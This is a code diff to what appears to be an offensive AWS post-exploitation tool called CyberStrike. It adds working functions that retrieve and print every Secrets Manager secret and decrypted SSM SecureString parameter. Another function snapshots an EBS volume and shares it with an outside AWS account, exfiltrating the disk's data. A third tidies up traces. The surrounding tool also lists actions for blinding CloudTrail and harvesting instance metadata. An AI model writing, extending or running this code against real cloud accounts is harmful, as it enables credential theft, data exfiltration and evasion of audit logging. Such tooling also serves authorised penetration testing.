@@ -437,8 +437,108 @@ async function cloudtrailBlind(args: string[], timeout: number): Promise<HookRes
   return { output: `ERROR: Unknown action: ${action}`, findings: [] }
 }
 
-async function stub(name: string): Promise<HookResult> {
-  return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
+async function secretsDump(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const service = argVal(args, "--service") || "all"
+  const output: string[] = ["[*] AWS Secrets Dump\n"]
+
+  if (service === "secretsmanager" || service === "all") {
+    const r = await aws(["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN]"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const secrets = tryJson(r.stdout) || []
+      output.push(`[+] Secrets Manager: ${secrets.length} secret(s)`)
+      for (const s of secrets) {
+        const val = await aws(["secretsmanager", "get-secret-value", "--secret-id", s[0], "--query", "SecretString"], profile, region, timeout)
+        if (val.exitCode === 0) {
+          const v = tryJson(val.stdout) || val.stdout
+          output.push(`[+] ${s[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
+        } else {
+          output.push(`[-] ${s[0]}: access denied`)
+        }
+      }
+    }
+  }
+
+  if (service === "ssm" || service === "all") {
+    const r = await aws(["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type]"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const params = tryJson(r.stdout) || []
+      const secure = params.filter((p: string[]) => p[1] === "SecureString")
+      output.push(`[+] SSM Parameters: ${params.length} total, ${secure.length} SecureString`)
+      for (const p of secure) {
+        const val = await aws(["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"], profile, region, timeout)
+        if (val.exitCode === 0) {
+          const v = tryJson(val.stdout) || val.stdout
+          output.push(`[+] ${p[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
+        } else {
+          output.push(`[-] ${p[0]}: access denied`)
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
+async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
+  const volumeId = argVal(args, "--volume-id")
+  const shareAccount = argVal(args, "--share-account")
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+
+  if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }
+
+  const r = await aws(["ec2", "create-snapshot", "--volume-id", volumeId, "--description", "CyberStrike forensic snapshot", "--tag-specifications", 'ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]'], profile, region, timeout)
+  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
+  const snap = tryJson(r.stdout)
+  const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]
+
+  if (shareAccount) {
+    const sr = await aws(["ec2", "modify-snapshot-attribute", "--snapshot-id", snap?.SnapshotId, "--attribute", "createVolumePermission", "--operation-type", "add", "--user-ids", shareAccount], profile, region, timeout)
+    output.push(sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`)
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
+async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const dryRun = hasFlag(args, "--dry-run")
+  const mode = dryRun ? "DRY RUN" : "LIVE"
+  const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]
+
+  const snaps = await aws(["ec2", "describe-snapshots", "--owner-ids", "self", "--filters", "Name=tag:CreatedBy,Values=CyberStrike", "--query", "Snapshots[].SnapshotId"], profile, region, timeout)
+  if (snaps.exitCode === 0) {
+    const snapList = tryJson(snaps.stdout) || []
+    output.push(`[+] Snapshots to clean: ${snapList.length}`)
+    for (const s of snapList) {
+      if (dryRun) { output.push(`    Would delete: ${s}`) }
+      else {
+        await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
+        output.push(`    Deleted: ${s}`)
+      }
+    }
+  }
+
+  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
+  if (trails.exitCode === 0) {
+    for (const t of (tryJson(trails.stdout) || [])) {
+      const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
+      const s = tryJson(status.stdout)
+      if (!s?.IsLogging) {
+        if (dryRun) { output.push(`    Would restart logging: ${t[0]}`) }
+        else {
+          await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
+          output.push(`[+] Restarted logging: ${t[0]}`)
+        }
+      }
+    }
+  }
+
+  output.push(`\n[*] Cleanup ${mode} complete`)
+  return { output: output.join("\n"), findings: [] }
 }
 
 // ── Tool definition ──
@@ -477,9 +577,9 @@ export const AwshookTool = Tool.define("awshook", {
       ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
       metadata_harvest: () => metadataHarvest(params.args),
       cloudtrail_blind: () => cloudtrailBlind(params.args, params.timeout_seconds),
-      secrets_dump: () => stub("secrets_dump"),
-      ec2_snapshot: () => stub("ec2_snapshot"),
-      cleanup_aws: () => stub("cleanup_aws"),
+      secrets_dump: () => secretsDump(params.args, params.timeout_seconds),
+      ec2_snapshot: () => ec2Snapshot(params.args, params.timeout_seconds),
+      cleanup_aws: () => cleanupAws(params.args, params.timeout_seconds),
     }
 
     try {
